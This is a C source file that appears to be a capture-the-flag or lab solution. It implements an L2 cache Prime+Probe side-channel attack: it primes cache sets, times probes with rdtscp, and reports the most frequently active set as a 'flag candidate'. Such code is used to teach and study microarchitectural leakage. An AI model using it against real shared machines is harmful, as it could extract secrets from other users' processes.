#include "util.h"
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_SIZE 64
#define L2_SETS   1024
#define L2_WAYS   16
#define SET_SPAN  (L2_SETS * LINE_SIZE)
#define BUFF_SIZE (SET_SPAN * L2_WAYS)

// How many probe samples to collect per set per reporting interval
#define SAMPLES_PER_SET   64
// Report every this many milliseconds worth of cycles (~3 GHz assumed; tune if needed)
#define REPORT_INTERVAL_CYCLES 300000000ULL

static inline uint64_t now_cycles(void)
{
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

// Prime all ways of a set into cache.
static inline void prime_set(void *buf, int set)
{
    volatile char tmp;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        tmp = *((volatile char *)buf + off);
    }
}

// Probe all ways of a set and return total access time.
static inline uint64_t probe_set(void *buf, int set)
{
    uint64_t total = 0;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        total += measure_one_block_access_time((uint64_t)((char *)buf + off));
    }
    return total;
}

int main(int argc, char **argv)
{
    void *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);
    if (buf == (void *)-1) { perror("mmap"); exit(1); }

    // Warm all pages
    for (size_t i = 0; i < BUFF_SIZE; i += LINE_SIZE)
        *((volatile char *)buf + i) = 1;

    printf("Buffer at %p. Press Enter to start probing...\n", buf);
    {
        char tmp[2];
        fgets(tmp, sizeof(tmp), stdin);
    }
       
    uint64_t *accum = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *count = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *wins  = calloc(L2_SETS, sizeof(uint64_t));
    if (!accum || !count || !wins) { perror("calloc"); exit(1); }

    uint64_t next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
    int epoch = 0;

    while (1) {
        for (int set = 0; set < L2_SETS; set++) {
            prime_set(buf, set);
            uint64_t wait = now_cycles() + 2000ULL;
            while (now_cycles() < wait) asm volatile("lfence" ::: "memory");
            accum[set] += probe_set(buf, set);
            count[set]++;
        }

        if (now_cycles() >= next_report) {
            epoch++;
            printf("\n=== Epoch %d — top 20 hottest sets ===\n", epoch);
            printf("%-6s  %-14s\n", "set", "avg_probe_cyc");

            int epoch_best_set = -1;
            uint64_t epoch_best_avg = 0;

            // Simple selection of top 20 by average.
            for (int rank = 0; rank < 20; rank++) {
                int best = -1;
                uint64_t best_avg = 0;
                for (int s = 0; s < L2_SETS; s++) {
                    if (count[s] == 0) continue;
                    uint64_t avg = accum[s] / count[s];
                    if (avg > best_avg) { best_avg = avg; best = s; }
                }
                if (best < 0) break;
                if (rank == 0) {
                    epoch_best_set = best;
                    epoch_best_avg = best_avg;
                }
                printf("%-6d  %-14lu\n", best, best_avg);
                accum[best] = 0; count[best] = 0; // remove so next rank finds next
            }

            if (epoch_best_set >= 0) {
                wins[epoch_best_set]++;
                int most_frequent_set = 0;
                uint64_t most_wins = wins[0];
                for (int s = 1; s < L2_SETS; s++) {
                    if (wins[s] > most_wins) {
                        most_wins = wins[s];
                        most_frequent_set = s;
                    }
                }

                printf("Epoch winner: set %d (avg=%lu)\n", epoch_best_set, epoch_best_avg);
                printf("Flag candidate (most frequent winner): set %d with %lu/%d epoch wins\n",
                       most_frequent_set, most_wins, epoch);
            }

            // Re-zero everything for the next epoch.
            memset(accum, 0, L2_SETS * sizeof(uint64_t));
            memset(count, 0, L2_SETS * sizeof(uint64_t));
            fflush(stdout);
            next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
        }
    }

    return 0;
}